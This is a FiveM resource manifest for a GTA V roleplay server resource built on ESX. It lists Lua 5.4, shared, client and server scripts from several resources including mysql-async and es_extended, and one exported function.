fx_version "bodacious"
games {"gta5"}

lua54 'yes'

shared_script '@TrujcaRP/client/lib/TrujcaRP.lua'

client_scripts {
   '@es_extended/locale.lua',
   'config.lua',
   'client.lua',
}

server_scripts {
   '@mysql-async/lib/MySQL.lua',
   '@es_extended/locale.lua',
   'config.lua',
   'server.lua',
}

exports {
	'ReturnConfig'
}

client_script '@pozdoodtajczyka/client/main.lua'